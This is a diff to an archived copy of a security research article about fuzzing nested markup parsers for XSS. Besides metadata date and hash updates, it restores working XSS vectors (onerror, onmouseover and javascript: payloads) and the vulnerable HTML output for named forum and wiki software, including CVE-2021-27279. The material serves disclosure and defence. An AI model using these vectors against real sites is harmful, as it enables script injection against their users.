@@ -6,9 +6,9 @@ resource: "https://swarm.ptsecurity.com/fuzzing-for-xss-via-nested-parsers-condi
 tags: [article, webseclist-reference, en-US, pt-swarm, xss, sanitizer-bypass, parser-differential, filter-bypass, fuzzing, injection, php, cve, owasp-a03-2021, owasp-a05-2021]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-09T10:26:30+00:00"
+  at: "2026-08-16T00:01:15+00:00"
 status: stable
-stale_after: 2027-08-09
+stale_after: 2027-08-16
 sources:
   - id: original
     resource: "https://swarm.ptsecurity.com/fuzzing-for-xss-via-nested-parsers-condition/"
@@ -22,7 +22,7 @@ canonical_url: ""
 cited_by:
   - "2021.md:14"
 commit: ""
-content_sha256: 41ca2fe14502b3d086487ccbb2f059f1029fc9de3d096b32f7dbc7f02594f705
+content_sha256: 31fbfa4a6ff3002d89fe8b015a7183a8c986992f50d9ec83ac78f2e2eb0f66fe
 depth: full
 depth_reason: default
 kind: article
@@ -35,7 +35,7 @@ publisher_english: ""
 raw_sha256: 999a59c37c772f786ea99b990b27fd3e027cddabb4962b7bab2052a36939da40
 retrieved_from: "https://swarm.ptsecurity.com/fuzzing-for-xss-via-nested-parsers-condition/"
 retrieved_kind: stored
-retrieved_utc: "2026-08-09T10:26:30+00:00"
+retrieved_utc: "2026-08-16T00:01:15+00:00"
 slug: pt-swarm-fuzzing-xss-nested-parsers-condition
 snapshot: ""
 title_english: ""
@@ -49,7 +49,7 @@ translation_of: ""
 
 - Published: date not stated
 - Original: <https://swarm.ptsecurity.com/fuzzing-for-xss-via-nested-parsers-condition/>
-- Preserved from: https://swarm.ptsecurity.com/fuzzing-for-xss-via-nested-parsers-condition/ (stored) on 2026-08-09
+- Preserved from: https://swarm.ptsecurity.com/fuzzing-for-xss-via-nested-parsers-condition/ (stored) on 2026-08-16
 - Licence: unknown
 
 Rights remain with the original author and publisher. This is a research
@@ -147,7 +147,7 @@ If you google “markdown XSS”, you will find examples with missing sanitizati
 There is a vulnerability when a parser converts user input to HTML and at the same time does not sanitize HTML characters. It could affect characters such as angle brackets `<` (0x3c) that are responsible for opening new HTML tags and quotes `"` (0x22), `'` (0x27) which are responsible for the beginning and the end of an HTML attribute:
 
 | Input | Output |  |
-| `[url]http://google.com/<img src=s >` | `<a href="http://google.com/%3cimg%20src=s%20onerror=alert(1)%3e">http://google.com/<img src=s >` |  |
+| `[url]http://google.com/<img src=s onerror=alert(1)>[/url]` | `<a href="http://google.com/%3cimg%20src=s%20onerror=alert(1)%3e">http://google.com/<img src=s onerror=alert(1)></a>` |  |
 | `[img]/favicon.ico?id="onload="alert(1)[/img]` | `<img src="/favicon.ico?id="onload="alert(1)" />` |  |
 
 ### Missing “javascript:” URL scheme sanitization
@@ -155,8 +155,8 @@ There is a vulnerability when a parser converts user input to HTML and at the sa
 This vulnerability can be exploited when a parser converts user input that contains URLs. If such parsers do not sanitize the “javascript:” URL scheme, it will allow the attacker to execute arbitrary JavaScript and perform XSS attacks:
 
 | Input | Output |  |
-| `[url=javascript:alert(1)]Click me![/url]` | `<a href="#">Click me!</a>` |  |
-| `[vid``eo]javascript:alert(1)[/video]` | `<iframe src="#"></iframe>` |  |
+| `[url=javascript:alert(1)]Click me![/url]` | `<a href="javascript:alert(1)">Click me!</a>` |  |
+| `[vid``eo]javascript:alert(1)[/video]` | `<iframe src="javascript:alert(1)"></iframe>` |  |
 
 ### Missing “file:” URL scheme sanitization
 
@@ -306,7 +306,7 @@ CVE: not assigned
 XSS vector (video BBcode + font BBcode):
 
 ```plaintext
-[VIDEO="aaa;000"]a[FONT="a  a"]a[/FONT]a[/VIDEO]
+[VIDEO="aaa;000"]a[FONT="a onmouseover=alert(location) a"]a[/FONT]a[/VIDEO]
 ```
 
 HTML output:
@@ -322,13 +322,13 @@ CVE: CVE-2021-27279.
 XSS vector (emal BBcode + email BBcode another syntax):
 
 ```plaintext
-[email]a@a.a?[email=a@a.a?  a]a[/email][/email]
+[email]a@a.a?[email=a@a.a? onmouseover=alert(1) a]a[/email][/email]
 ```
 
 HTML output:
 
 ```plaintext
-<a href="mailto:a@a.a?<a href="mailto:a@a.a?  a" class="mycode_email">a" class="mycode_email">a@a.a?[email=a@a.a?  a]a</a></a>
+<a href="mailto:a@a.a?<a href="mailto:a@a.a? onmouseover=alert(1) a" class="mycode_email">a" class="mycode_email">a@a.a?[email=a@a.a? onmouseover=alert(1) a]a</a></a>
 ```
 
 ### PMWiki
@@ -382,7 +382,7 @@ XSS vector (URL BBcode + URL BBcode another syntax):
 HTML output:
 
 ```plaintext
-<a href='http://a<a href='http://onmouseover=alert(1)// a' >a' >http://a[url=http://onmouseover=alert(1)// a]a</a></a>
+<a href='http://a<a href='http://onmouseover=alert(1)// a' onclick='window.open(this.href); return false;'>a' onclick='window.open(this.href); return false;'>http://a[url=http://onmouseover=alert(1)// a]a</a></a>
 ```
 
 ### SCEditor < 3 / SMF 2.1 – 2.1 RC3
@@ -424,13 +424,13 @@ CVE: not assigned
 XSS vector (HTML <img alt> + HTML <img>):
 
 ```plaintext
-<img alt="<img >"<">
+<img alt="<img onerror=alert(1)//"<">
 ```
 
 HTML output:
 
 ```plaintext
-img alt="<img >" src="src" />
+img alt="<img onerror=alert(1)//" src="src" />
 ```
 
 ## Recommendations for elimination
